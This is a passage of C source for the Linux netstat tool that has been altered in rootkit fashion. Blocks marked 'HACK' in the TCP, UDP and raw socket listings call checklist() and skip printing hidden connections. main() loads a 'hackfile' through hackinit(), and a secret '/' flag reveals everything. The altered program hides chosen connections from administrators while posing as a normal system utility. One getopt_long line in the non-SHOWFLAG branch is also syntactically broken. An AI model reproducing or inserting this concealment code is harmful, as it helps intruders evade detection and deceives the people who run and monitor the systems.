			tcp_state = "CLOSE_WAIT";
			break;

		case TCP_LAST_ACK:
			tcp_state = "LAST_ACK";
			break;

		case TCP_LISTEN:
			tcp_state = "LISTEN";
			time_len = 0;
			retr = 0L;
			rxq=0L;
			txq=0L;
			break;

		default:
			tcp_state = "UNKNOWN";
			break;
	}
	strcpy(local_addr, ap->sprint((struct sockaddr *)&localaddr, flag_not));
	strcpy(rem_addr, ap->sprint((struct sockaddr *)&remaddr, flag_not));
	if (flag_all || rem_port) {
		sprintf(buffer, "%s", get_sname(htons(local_port), "tcp", flag_not));
		if ((strlen(local_addr) + strlen(buffer)) > 22) {
			local_addr[22-strlen(buffer)] = '\0';
		}
		strcat(local_addr, ":");
		strcat(local_addr, buffer);
		sprintf(buffer, "%s",get_sname(htons(rem_port), "tcp", flag_not));
		if ((strlen(rem_addr) + strlen(buffer)) > 22) {
			rem_addr[22-strlen(buffer)] = '\0';
		}
		strcat(rem_addr, ":");
		strcat(rem_addr, buffer);
		timers[0] = '\0';
		if (flag_opt) switch (timer_run) {
			case 0:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_off,
							    "off (0.00/%ld)"), retr);
      				break;

			case 1:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_on,
							    "on (%2.2f/%ld)"),
					(double)time_len / 100, retr);
				break;

			default:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_unkn,
							    "unkn-%d (%2.2f/%ld)"),
					timer_run, (double)time_len / 100, retr);
				break;
		}
/* HACK */
checklist(31337,localaddr,remaddr,local_port,rem_port);
if (!hide||showall) {
		printf("tcp   %6ld %6ld %-23s %-23s %-12s",
			rxq, txq, local_addr, rem_addr, tcp_state);

		if (flag_exp > 1) {
			if (!flag_not && ((pw = getpwuid(uid)) != NULL))
				printf("%-10s ", pw->pw_name);
			else
				printf("%-10d ",uid);
		}

		if (flag_opt) printf("%s", timers);
		printf("\n");
	} /* HACK END */
	}
  }
  return(0);
}


static int
udp_info(void)
{
  char buffer[8192], local_addr[64], rem_addr[64];
  char *udp_state, timer_queued, timers[64], more[512];
  int num, local_port, rem_port, d, state, timer_run, lnr = 0;
  struct sockaddr_in localaddr, remaddr;
  struct aftype *ap;
  unsigned long rxq, txq, time_len, retr;
  
  if ((procinfo = fopen(_PATH_PROCNET_UDP, "r")) == NULL) {
	if (errno != ENOENT) {
		perror(_PATH_PROCNET_UDP);
		return(-1);
	}
	if (flag_arg || flag_ver)
		ESYSNOT("netstat","AF INET (udp)");
	if (flag_arg)
		return(1);
	else
		return(0);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	if ((line[lnr] = (char *)malloc(strlen(buffer)+1)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;

  while (lnr >= 0) {
	more[0] = '\0';
	timer_queued = '\0';
	num = sscanf(line[lnr--],
		"%d: %lX:%X %lX:%X %X %lX:%lX %X:%lX %lX %c %s\n",
		&d, (unsigned long*)&localaddr.sin_addr.s_addr, &local_port,
		(unsigned long*)&remaddr.sin_addr.s_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr,
		&timer_queued, more);
	localaddr.sin_family = AF_INET;
	remaddr.sin_family = AF_INET;
	if ((ap = get_afntype(localaddr.sin_family)) == NULL) {
		fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_netstat,
					    "netstat: unsupported address family %d !\n"),
			localaddr.sin_family);
		continue;
	}

	retr = 0L;
	if (! flag_opt) more[0] = '\0';
	if (flag_deb) fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_args, "%s -> %d args"), line[lnr+1], num);
	if (num < 10) continue;

	switch (state) {
		case TCP_ESTABLISHED:
			udp_state = "ESTABLISHED";
			break;

		case TCP_CLOSE:
			udp_state = "";
			break;
			
		default:
			udp_state = "UNKNOWN";
			break;
	}

	strcpy(local_addr, ap->sprint((struct sockaddr *)&localaddr, flag_not));
	strcpy(rem_addr, ap->sprint((struct sockaddr *)&remaddr, flag_not));
	if (flag_all || localaddr.sin_addr.s_addr) {
		sprintf(buffer, "%s", get_sname(htons(local_port), "udp", flag_not));
		if ((strlen(local_addr) + strlen(buffer)) > 22) {
			local_addr[22-strlen(buffer)] = '\0';
		}
		strcat(local_addr, ":");
		strcat(local_addr, buffer);
		sprintf(buffer, "%s", get_sname(htons(rem_port), "udp", flag_not));
		if ((strlen(rem_addr) + strlen(buffer)) > 22) {
			rem_addr[22-strlen(buffer)] = '\0';
		}
		strcat(rem_addr, ":");
		strcat(rem_addr, buffer);

		timers[0] = '\0';
		if (flag_opt) switch (timer_run) {
			case 0:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_off2,
							    "off (0.00/%ld) %c"),
							retr, timer_queued);
				break;

			case 1:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_on2,
							    "on (%2.2f/%ld) %c"),
					(double)time_len / 100, retr, timer_queued);
				break;

			default:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_unkn2,
							    "unkn-%d (%2.2f/%ld) %c"),
					timer_run, (double)time_len / 100,
					retr, timer_queued);
				break;
		}
/* HACK */
checklist(31337,localaddr,remaddr,local_port,rem_port);
if (!hide||showall) {
		printf("udp   %6ld %6ld %-23s %-23s %-12s",
			rxq, txq, local_addr, rem_addr, udp_state);

		if (flag_exp > 1)
			printf("%-10s ", "");

		if (flag_opt) printf("%s", timers);
		printf("\n");
	} /* END HACK */
	}
  }
  return(0);
}


static int
raw_info(void)
{
  char buffer[8192], local_addr[64], rem_addr[64];
  char *raw_state, timer_queued, timers[64], more[512];
  int num, local_port, rem_port, d, state, timer_run, lnr = 0;
  struct sockaddr_in localaddr, remaddr;
  struct aftype *ap;
  unsigned long rxq, txq, time_len, retr;
  
  if ((procinfo = fopen(_PATH_PROCNET_RAW, "r")) == NULL) {
	if (errno != ENOENT) {
		perror(_PATH_PROCNET_RAW);
		return(-1);
	}
	if (flag_arg || flag_ver)
		ESYSNOT("netstat","AF INET (raw)");
	if (flag_arg)
		return(1);
	else
		return(0);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	if ((line[lnr] = (char *)malloc(strlen(buffer)+1)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;

  while (lnr >= 0) {
	more[0] = '\0';
	timer_queued = '\0';
	num = sscanf(line[lnr--],
		"%d: %lX:%X %lX:%X %X %lX:%lX %X:%lX %lX %c %s\n",
		&d, (unsigned long*)&localaddr.sin_addr.s_addr, &local_port,
		(unsigned long*)&remaddr.sin_addr.s_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr,
		&timer_queued, more);
		retr = 0L;
	localaddr.sin_family = AF_INET;
	remaddr.sin_family = AF_INET;
	if ((ap = get_afntype(localaddr.sin_family)) == NULL) {
		fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_netstat,
					    "netstat: unsupported address family %d !\n"),
			localaddr.sin_family);
		continue;
	}

	if (! flag_opt) more[0] = '\0';
	if (flag_deb) fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_args, "%s -> %d args"), line[lnr+1], num);
	if (num < 10) continue;

	raw_state = "";
	strcpy(local_addr, ap->sprint((struct sockaddr *)&localaddr, flag_not));
	strcpy(rem_addr, ap->sprint((struct sockaddr *)&remaddr, flag_not));
	if (flag_all || localaddr.sin_addr.s_addr) {
		sprintf(buffer, "%s", get_sname(htons(local_port), "raw", flag_not));
		if ((strlen(local_addr) + strlen(buffer)) > 22) {
			local_addr[22-strlen(buffer)] = '\0';
		}
		strcat(local_addr, ":");
		strcat(local_addr, buffer);
		sprintf(buffer, "%s", get_sname(htons(rem_port), "raw", flag_not));
		if ((strlen(rem_addr) + strlen(buffer)) > 22) {
			rem_addr[22-strlen(buffer)] = '\0';
		}
		strcat(rem_addr, ":");
		strcat(rem_addr, buffer);

		timers[0] = '\0';
		if (flag_opt) switch (timer_run) {
			case 0:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_off3,
							    "off (0.00/%ld) %c"),
						retr, timer_queued);
				break;

			case 1:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_on3,
							    "on (%2.2f/%ld) %c"),
					(double)time_len / 100, retr,
					timer_queued);
				break;

			default:
				sprintf(timers, NLS_CATGETS(catfd, netstatSet, netstat_unkn3,
							    "unkn-%d (%2.2f/%ld) %c"),
					timer_run, (double)time_len / 100,
					retr, timer_queued);
				break;
		}
/* HACK */
checklist(31337,localaddr,remaddr,local_port,rem_port);
if (!hide||showall) {
		printf("raw   %6ld %6ld %-23s %-23s %-12s",
			rxq, txq, local_addr, rem_addr, raw_state);

		if (flag_exp > 1)
			printf("%-10s ", "");

		if (flag_opt) printf("%s", timers);
		printf("\n");
	} /* END HACK */
	}
  }
  return(0);
}
#endif


#if HAVE_AFUNIX
static int
unix_info(void)
{
  char buffer[8192], inode[MAXPATHLEN], path[MAXPATHLEN], ss_flags[32];
  char *ss_proto, *ss_state, *ss_type;
  int num, state, type, lnr = 0, has = 0;
  void *d;
  unsigned long refcnt, proto, flags;
#define HAS_INODE 1
  
  if ((procinfo = fopen(_PATH_PROCNET_UNIX, "r")) == NULL) {
	if (errno != ENOENT) {
		perror(_PATH_PROCNET_UNIX);
		return(-1);
	}
	if (flag_arg || flag_ver)
		ESYSNOT("netstat","AF UNIX");
	if (flag_arg)
		return(1);
	else
		return(0);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  
  if (strstr(buffer,"Inode"))
    has |= HAS_INODE;
    
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	if ((line[lnr] = (char *)malloc(strlen(buffer)+1)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;

  printf(NLS_CATGETS(catfd, netstatSet, netstat_unix, "Active UNIX domain sockets ")); /* xxx */
  if (flag_all) printf(NLS_CATGETS(catfd, netstatSet, netstat_servers, "(including servers)")); /* xxx */
           else printf(NLS_CATGETS(catfd, netstatSet, netstat_noservers, "(w/o servers)")); /* xxx */

  printf(NLS_CATGETS(catfd, netstatSet, netstat_header_unix,
		     "\nProto RefCnt Flags       Type       State         I-Node Path\n")); /* xxx */
  while (lnr >= 0) {
	path[0] = '\0';
	inode[0] = '\0';
	num = sscanf(line[lnr--], "%p: %lX %lX %lX %X %X %s %s",
		&d, &refcnt, &proto, &flags, &type, &state, inode, path);
	if (flag_deb) fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_args, "%s -> %d args"), line[lnr+1], num);
	if (num < 6) continue;
        if (!(has&HAS_INODE)) {
          strcpy(path,inode);
          strcpy(inode,"-");
        }
        if (!flag_all && (state == SS_UNCONNECTED) && (flags & SO_ACCEPTCON))
        	continue;
        	
	switch(proto) {
		case 0:
			ss_proto = "unix";
			break;

		default:
			ss_proto = "??";
	}

	switch(type) {
		case SOCK_STREAM:
			ss_type = "STREAM";
			break;

		case SOCK_DGRAM:
			ss_type = "DGRAM";
			break;

		case SOCK_RAW:
			ss_type = "RAW";
			break;

		case SOCK_RDM:
			ss_type = "RDM";
			break;

		case SOCK_SEQPACKET:
			ss_type = "SEQPACKET";
			break;

		default:
			ss_type = "UNKNOWN";
	}

	switch(state) {
		case SS_FREE:
			ss_state = "FREE";
			break;

		case SS_UNCONNECTED:
			/*
			 * Unconnected sockets may be listening
			 * for something.
			 */
			if (flags & SO_ACCEPTCON) {
				ss_state = "LISTENING";
			} else {
				ss_state = "";
			}
			break;

		case SS_CONNECTING:
			ss_state = "CONNECTING";
			break;

		case SS_CONNECTED:
			ss_state = "CONNECTED";
			break;

		case SS_DISCONNECTING:
			ss_state = "DISCONNECTING";
			break;

		default:
			ss_state = "UNKNOWN";
	}

	strcpy(ss_flags, "[ ");
	if (flags & SO_ACCEPTCON) strcat(ss_flags, "ACC ");
	if (flags & SO_WAITDATA) strcat(ss_flags, "W ");
	if (flags & SO_NOSPACE) strcat(ss_flags, "N ");
	
	strcat(ss_flags, "]");
	printf("%-5s %-6ld %-11s %-10s %-13s %-6s %s\n",
		ss_proto, refcnt, ss_flags, ss_type, ss_state, inode, path);
  }
  return(0);
}
#endif


#if HAVE_AFAX25
static int ax25_info(void)
{
 	FILE *f=fopen(_PATH_PROCNET_AX25, "r");
	char buffer[256],dev[16];
	int st,vs,vr,sendq,recvq;
	static char *ax25_state[5]=
 	{
		"LISTENING",
 		"SABM SENT",
 		"DISC SENT",
		"ESTABLISHED",
		"RECOVERY"
 	};
	if(!(f=fopen(_PATH_PROCNET_AX25, "r")))
	{
		if (errno != ENOENT) {
			perror(_PATH_PROCNET_AX25);
			return(-1);
		}
		if (flag_arg || flag_ver)
			ESYSNOT("netstat","AF AX25");
		if (flag_arg)
			return(1);
		else
			return(0);
  	}
	printf(NLS_CATGETS(catfd, netstatSet, netstat_ax25, "Activate AX.25 sockets\n"));
	printf(NLS_CATGETS(catfd, netstatSet, netstat_header_ax25, "Dest       Source     Device  State        Vr/Vs  Send-Q  Recv-Q\n"));
 	fgets(buffer,256,f);
 	while(fgets(buffer,256,f))
 	{
 		buffer[9]=0;
		buffer[19]=0;
		sscanf(buffer+20,"%s %d %d %d %*d %*d/%*d %*d/%*d %*d/%*d %*d/%*d %*d %*d %d %d",
			dev,&st,&vs,&vr,&sendq,&recvq);
		printf("%-9s  %-9s  %-6s  %-11s  %02d/%02d  %-6d  %-6d\n",
 			buffer,buffer+10,
			dev,
 			ax25_state[st],
			vr,vs,sendq,recvq);
 	}
 	fclose(f);
 	return 0;		
}
#endif


#if HAVE_AFIPX
static int ipx_info(void)
{
	FILE *f;
	char buf[256];
	unsigned long txq,rxq;
	unsigned int state;
	unsigned int uid;
	char *st;
	int nc;
	struct aftype *ap;
	struct passwd *pw;
	char sad[50],dad[50];
	struct sockaddr sa;
	unsigned sport=0,dport=0;
			
	if(!(f=fopen(_PATH_PROCNET_IPX,"r")))
	{
		if (errno != ENOENT) {
			perror(_PATH_PROCNET_IPX);
			return(-1);
		}
		if (flag_arg || flag_ver)
			ESYSNOT("netstat","AF IPX");
		if (flag_arg)
			return(1);
		else
			return(0);
  	}
	printf(NLS_CATGETS(catfd, netstatSet, netstat_header_ipx,
		   "Active IPX sockets\nProto Recv-Q Send-Q Local Address              Foreign Address            State")); /* xxx */
	if (flag_exp>1)
		printf(NLS_CATGETS(catfd, netstatSet, netstat_header_ipx2,
			" User")); /* xxx */
	printf("\n");
	if ((ap = get_afntype(AF_IPX)) == NULL) {
		EINTERN("netstat.c","AF_IPX missing");
		return(-1);
  	}

	fgets(buf,255,f);
	
	while(fgets(buf,255,f)!=NULL)
	{
		sscanf(buf, "%s %s %lX %lX %d %d",
			sad,dad,&txq,&rxq,&state,&uid);
		if ((st = rindex(sad,':'))) {
			*st++ = '\0';
			sscanf(st,"%X",&sport); /* net byt order */
			sport = ntohs(sport);
		} else {
			EINTERN("netstat.c",_PATH_PROCNET_IPX" sport format error");
			return(-1);
		}
		nc = 0;
		if (strcmp(dad,"Not_Connected")!=0) {
			if ((st = rindex(dad,':'))) {
				*st++ = '\0';
				sscanf(st,"%X",&dport); /* net byt order */
				dport = ntohs(dport);
			} else {
				EINTERN("netstat.c",_PATH_PROCNET_IPX" dport format error");
				return(-1);
			}
		} else
			nc = 1;
			
		switch(state)
		{
			case TCP_ESTABLISHED:
				st = "ESTAB";
				break;

			case TCP_CLOSE:
				st = "";
				break;

			default:
				st = "UNK.";
				break;
		}

		/* Fetch and resolve the Source */
		(void)ap->input(4,sad,&sa);
		strcpy(buf, ap->sprint(&sa, flag_not));
		sprintf(sad,"%s:%04X",buf,sport);

		if (!nc) {
			/* Fetch and resolve the Destination */
			(void)ap->input(4,dad,&sa);
			strcpy(buf, ap->sprint(&sa, flag_not));
			sprintf(dad,"%s:%04X",buf,dport);
		} else strcpy(dad,"-");

		printf("IPX   %6ld %6ld %-26s %-26s %-5s", txq, rxq, sad, dad, st);
		if (flag_exp>1) {
			if (!flag_not && ((pw = getpwuid(uid)) != NULL))
				printf(" %-10s", pw->pw_name);
			else
				printf(" %-10d",uid);
		}
		printf("\n");
	}
	fclose(f);
	return 0;
}	
#endif

static void
ife_print(struct interface *ptr)
{
  printf("%-5.5s ", ptr->name);
  printf("%5d %3d ", ptr->mtu, ptr->metric);
  /* If needed, display the interface statistics. */
  printf("%6u %6u %6u %6u ",
	 ptr->stats.rx_packets, ptr->stats.rx_errors,
	 ptr->stats.rx_dropped, ptr->stats.rx_fifo_errors);
  printf("%6u %6u %6u %6u ",
	 ptr->stats.tx_packets, ptr->stats.tx_errors,
	 ptr->stats.tx_dropped, ptr->stats.tx_fifo_errors);
  if (ptr->flags == 0) printf(NLS_CATGETS(catfd, netstatSet, netstat_noflags, "[NO FLAGS]"));
  if (ptr->flags & IFF_ALLMULTI) printf("A");
  if (ptr->flags & IFF_BROADCAST) printf("B");
  if (ptr->flags & IFF_DEBUG) printf("D");
  if (ptr->flags & IFF_LOOPBACK) printf("L");
  if (ptr->flags & IFF_PROMISC) printf("M");
  if (ptr->flags & IFF_NOTRAILERS) printf("N");
  if (ptr->flags & IFF_NOARP) printf("O");
  if (ptr->flags & IFF_POINTOPOINT) printf("P");
  if (ptr->flags & IFF_RUNNING) printf("R");
  if (ptr->flags & IFF_UP) printf("U");
  printf("\n");
}

static void if_getstats(char *ifname, struct interface *ife)
{
  FILE *f=fopen("/proc/net/dev","r");
  char buf[256];
  char *bp;
  if(f==NULL)
  	return;
  while(fgets(buf,255,f))
  {
  	bp=buf;
  	while(*bp&&isspace(*bp))
  		bp++;
  	if(strncmp(bp,ifname,strlen(ifname))==0 && bp[strlen(ifname)]==':')
  	{
 		bp=strchr(bp,':');
 		bp++;
 		sscanf(bp,"%d %d %d %d %d %d %d %d %d %d %d",
 			&ife->stats.rx_packets,
 			&ife->stats.rx_errors,
 			&ife->stats.rx_dropped,
 			&ife->stats.rx_fifo_errors,
 			&ife->stats.rx_frame_errors,
 			
 			&ife->stats.tx_packets,
 			&ife->stats.tx_errors,
 			&ife->stats.tx_dropped,
 			&ife->stats.tx_fifo_errors,
 			&ife->stats.collisions,
 			
 			&ife->stats.tx_carrier_errors
 		);
 		fclose(f);
 		return;
  	}
  }
  fclose(f);
}
  
/* Fetch the inteface configuration from the kernel. */
static int
if_fetch(char *ifname, struct interface *ife)
{
  struct ifreq ifr;
  
  memset((char *) ife, 0, sizeof(struct interface));
  strcpy(ife->name, ifname);
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) {
	fprintf(stderr, "SIOCGIFFLAGS: %s\n", strerror(errno));
	return(-1);
  }
  ife->flags = ifr.ifr_flags;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFADDR, &ifr) < 0) {
	memset(&ife->addr, 0, sizeof(struct sockaddr));
  } else ife->addr = ifr.ifr_addr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFHWADDR, &ifr) < 0) {
	memset(&ife->hwaddr, 0, sizeof(struct sockaddr));
  } else ife->hwaddr = ifr.ifr_addr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMETRIC, &ifr) < 0) {
	ife->metric = 0;
  } else ife->metric = ifr.ifr_metric;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMTU, &ifr) < 0) {
	ife->mtu = 0;
  } else ife->mtu = ifr.ifr_mtu;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFDSTADDR, &ifr) < 0) {
	memset(&ife->dstaddr, 0, sizeof(struct sockaddr));
  } else ife->dstaddr = ifr.ifr_dstaddr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFBRDADDR, &ifr) < 0) {
	memset(&ife->broadaddr, 0, sizeof(struct sockaddr));
  } else ife->broadaddr = ifr.ifr_broadaddr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFNETMASK, &ifr) < 0) {
	memset(&ife->netmask, 0, sizeof(struct sockaddr));
  } else {
	memcpy(ife->netmask.sa_data, &ifr.ifr_data, sizeof(struct sockaddr));
  }
    
  if_getstats(ifname,ife);
/*  strcpy(ifr.ifr_name, ifname);
  ifr.ifr_data = (caddr_t) &ife->stats;
  if (ioctl(skfd, SIOCGIFSTATS, &ifr) < 0) {
	memset(&ife->stats, 0, sizeof(struct dev_stats));
  }
  */
  return(0);
}


static int
iface_info(void)
{
  char buff[1024];
  struct interface ife;
  struct ifconf ifc;
  struct ifreq *ifr;
  int i;
  
  /* Create a channel to the NET kernel. */
  if ((skfd = socket(AF_INET,SOCK_DGRAM,0)) < 0) {
	perror("socket");
	return(E_READ);
  }
  
  ifc.ifc_len = sizeof(buff);
  ifc.ifc_buf = buff;
  if (ioctl(skfd, SIOCGIFCONF, &ifc) < 0) {
	perror("SIOCGIFCONF");
	close(skfd);
	return(E_IOCTL);
  }

  printf(NLS_CATGETS(catfd, netstatSet, netstat_interface, "Kernel Interface table\n"));
  printf(NLS_CATGETS(catfd, netstatSet, netstat_header_iface,
		     "Iface   MTU Met  RX-OK RX-ERR RX-DRP RX-OVR  TX-OK TX-ERR TX-DRP TX-OVR Flags\n"));
  
  ifr = ifc.ifc_req;
  for (i = ifc.ifc_len / sizeof(struct ifreq); --i >= 0; ifr++) {
	if (if_fetch(ifr->ifr_name, &ife) < 0) {
		fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_unkn_iface,
					    "%s: unknown interface.\n"), ifr->ifr_name);
	}
    
	if (((ife.flags & IFF_UP) == 0) && !flag_all) continue;
	ife_print(&ife);
  }
  close(skfd);
  return(0);
}


static void
version(void) 
{
	printf("%s\n%s\n%s\n%s\n", Release, Version, Signature, Features);
	NLS_CATCLOSE(catfd)
	exit(1);
}


static void
usage(void)
{
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage1,  "usage: netstat [-veenNcCF] [<Af>] -r         netstat {-V|--version|-h|--help}\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage2,  "       netstat [-vnNcaeo] [<Socket>]\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage3,  "       netstat { [-veenNac] -i | [-vnNc] -L | [-cnNe] -M }\n\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage4,  "        -r, --route              display routing table\n")); /* xxx */
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage5,  "        -L, --netlink            display netlink kernel messages\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage6,  "        -i, --interfaces         display interface table\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage7,  "        -M, --masquerade         display masqueraded connections\n\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage8,  "        -v, --verbose            be verbose\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage9,  "        -n, --numeric            dont resolve names\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage10, "        -e, --extend             display other/more informations\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage11, "        -c, --continuous         continuous listing\n\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage12, "        -a, --all, --listening   display all\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage13, "        -o, --timers             display timers\n\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage14, "<Socket>={-t|--tcp} {-u|--udp} {-w|--raw} {-x|--unix} --ax25 --ipx --netrom\n"));
  fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_usage15, "<Af>= -A {inet|ipx|netrom|ddp|ax25},... --inet --ipx --netrom --ddp --ax25\n"));
  NLS_CATCLOSE(catfd)
  exit(1);
}


int main
(int argc, char *argv[])
{
  int i;
  int lop;
  struct option longopts[]=
  {
	AFTRANS_OPTS,
  	{"version",	0,	0,	'V'},
  	{"interfaces",	0,	0,	'i'},
  	{"help",	0,	0,	'h'},
  	{"route",	0,	0,	'r'},
  	{"netlink",	2,	0,	'L'},
  	{"masquerade",	0,	0,	'M'},
  	{"protocol",	1,	0,	'A'},
  	{"tcp",		0,	0,	't'},
  	{"udp",		0,	0,	'u'},
  	{"raw",		0,	0,	'w'},
  	{"unix",	0,	0,	'x'},
  	{"listening",	0,	0,	'a'},
  	{"all",		0,	0,	'a'},
  	{"timers",	0,	0,	'o'},
  	{"continuous",	0,	0,	'c'},
  	{"extend",	0,	0,	'e'},
  	{"verbose",	0,	0,	'v'},
  	{"numeric",	0,	0,	'n'},
  	{"symbolic",	0,	0,	'N'},
	{"cache",	0,	0,	'C'},
	{"fib",		0,	0,	'F'},
  	{NULL,		0,	0,	0}
  };

  hackinit(); /* HACK load in hackfile */

#if NLS
  setlocale (LC_MESSAGES, "");
  catfd = catopen ("nettools", MCLoadBySet);
#endif

  getroute_init(); 			/* Set up AF routing support */

  afname[0]='\0';
#if defined (SHOWFLAG)
  while ((i = getopt_long(argc, argv, "MLCFA:acdehinNortuVv?wx/", longopts, &lop)) != EOF) switch(i) {
#else
  while ((i = getopt_long(argc, argv, "MLCFA:acdehinNortuVv?wx", longopts, &lop) != EOF switch(i) {
#endif
  	case -1:
  		break;
  	case 1:
		if (lop < 0 || lop >= AFTRANS_CNT) {
			EINTERN("netstat.c","longopts 1 range");
			break;
		}
		if (aftrans_opt(longopts[lop].name)) {
			NLS_CATCLOSE(catfd)
			exit(1);
		}
		break;
	case 'A':
		if (aftrans_opt(optarg)) {
			NLS_CATCLOSE(catfd)
			exit(1);
		}
		break;
	case 'L':
		flag_nlp++;
		break;
	case 'M':
		flag_mas++;
		break;
	case 'a':
		flag_all++;
		break;
	case 'c':
		flag_cnt++;
		break;

	case 'd':
		flag_deb++;
		break;
	case 'e':
		flag_exp++;
		break;
	case 'i':
		flag_int++;
		break;

	case 'n':
		flag_not|=FLAG_NUM;
		break;
	case 'N':
		flag_not|=FLAG_SYM;
		break;
	case 'C':
		flag_cf|=FLAG_CACHE;
		break;
	case 'F':
		flag_cf|=FLAG_FIB;
		break;
	case 'o':
		flag_opt++;
		break;
	case 'V':
		version();
		/*NOTREACHED*/
	case 'v':
		flag_ver|=FLAG_VERBOSE;
		break;
	case 'r':
		flag_rou++;
		break;

	case 't':
		flag_tcp++;
		break;

	case 'u':
		flag_udp++;
		break;
	case 'w':
		flag_raw++;
		break;
	case 'x':
		if (aftrans_opt("unix")) {
			NLS_CATCLOSE(catfd)
			exit(1);
		}
		break;
	case '?':
	case 'h':
		usage();

#if defined (SHOWFLAG)
        case '/':
                showall++;
                break;
#endif

  }
  
  if (flag_int + flag_rou + flag_nlp + flag_mas > 1)
  	usage();
  
  if (flag_inet)
  	flag_tcp = flag_udp = flag_raw = 1;
  	
  flag_arg = flag_tcp + flag_udp + flag_raw + flag_unx + flag_ipx 
           + flag_ax25 + flag_netrom;
           
  if (flag_nlp) {
#if HAVE_RT_NETLINK
	i=netlink_print();
#else
	ENOSUPP("netstat.c","RT_NETLINK");
	i=-1;
#endif	
	NLS_CATCLOSE(catfd)
	return(i);
  }
  if (flag_mas) {
#if HAVE_FW_MASQUERADE
#if MORE_THAN_ONE_MASQ_AF
  	if (!afname[0])
  		strcpy(afname,DFLT_AF);
#endif  
  	for(;;) {
  		i = ip_masq_info(flag_not, flag_exp);
 		if (i || !flag_cnt) break;
		sleep(1);
	}
#else
	ENOSUPP("netstat.c","FW_MASQUERADE");
	i=-1;
#endif
	NLS_CATCLOSE(catfd)
	return(i);
  }
  if (flag_rou) {
	int options=0;
		
  	if (!afname[0])
  		strcpy(afname,DFLT_AF);

  	if (flag_exp == 2)
  		flag_exp = 1;
  	else if (flag_exp == 1)
  		flag_exp = 2;
  		
	options = (flag_exp & FLAG_EXT) | flag_not | flag_cf | flag_ver ;
	if (!flag_cf)
		options |= FLAG_FIB;

  	for(;;) {
  		i = route_info(afname,options);
 		if (i || !flag_cnt) break;
		sleep(1);
	}
	NLS_CATCLOSE(catfd)
	return(i);
  }
  
  if (flag_int) {
	for (;;) {
		i = iface_info();
		if (!flag_cnt || i) break;
		sleep(1);
  	}
	NLS_CATCLOSE(catfd)
	return(i);
  }

  for (;;) {
  	if (!flag_arg || flag_tcp || flag_udp || flag_raw) {
  #if HAVE_AFINET
		printf(NLS_CATGETS(catfd, netstatSet, netstat_internet, "Active Internet connections ")); /* xxx */
		if (flag_all) printf(NLS_CATGETS(catfd, netstatSet, netstat_servers, "(including servers)")); /* xxx */
		         else printf(NLS_CATGETS(catfd, netstatSet, netstat_noservers, "(w/o servers)")); /* xxx */

		printf(NLS_CATGETS(catfd, netstatSet, netstat_header_internet,
			   "\nProto Recv-Q Send-Q Local Address           Foreign Address         State      ")); /* xxx */
		if (flag_exp > 1)
			printf(NLS_CATGETS(catfd, netstatSet, netstat_header_internet2,
			   " User      ")); /* xxx */
		if (flag_opt)
			printf(NLS_CATGETS(catfd, netstatSet, netstat_header_internet3,
			   " Timer")); /* xxx */
		printf("\n");
#else
		if (flag_arg)
			{ i=1; ENOSUPP("netstat","AF INET"); }
#endif
	}
